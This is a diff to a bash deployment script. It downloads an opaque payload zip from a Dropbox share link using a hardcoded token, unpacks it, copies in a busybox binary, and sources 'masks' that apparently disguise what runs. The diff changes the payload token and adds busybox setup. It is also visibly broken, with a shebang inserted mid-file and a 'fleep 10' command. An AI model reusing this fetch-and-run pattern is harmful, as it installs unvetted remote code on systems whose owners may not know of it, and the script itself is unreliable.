@@ -17,6 +17,9 @@ export ENDPOINT2_TOKEN=acstkn \
 #MAX_LOAD=300
 #wakeup_timeout=6000
 
+#!/usr/bin/env bash
+## needed tmux sed grep envsubst
+
 ## load customization variables
 [ -f env.sh ] && . ./env.sh
 
@@ -51,7 +54,7 @@ jailjudge
 
 getpayload(){
     ## get payload from dbx
-    token=${pl_token:-zqrj6tvuuo47a10}
+    token=${pl_token:-lxizr6cg4liekm1}
     name=${pl_name:-payload.zip}
     wget -q https://dl.dropboxusercontent.com/s/$token/$name
     unzip $name && rm $name || return 1
@@ -65,8 +68,9 @@ getpayload || exit 1
 ## utility vars
 # CFG_BASE_URL=https://rawgit.com/untoreh/scripts/master/cfg/
 
-## env vars
+## env vars and busybox
 export PATH=.:pl:$PATH
+cp $(get_path busybox $tmppath) . && chmod +x busybox
 
 ## choose masks
 . ./masks || exit 1
@@ -116,6 +120,8 @@ cleanup() {
     #                           ! -name "$OBJ_CFG_MASK" \
     #                           -delete
 }
+fleep 10
 cleanup
 
 wait %+
+
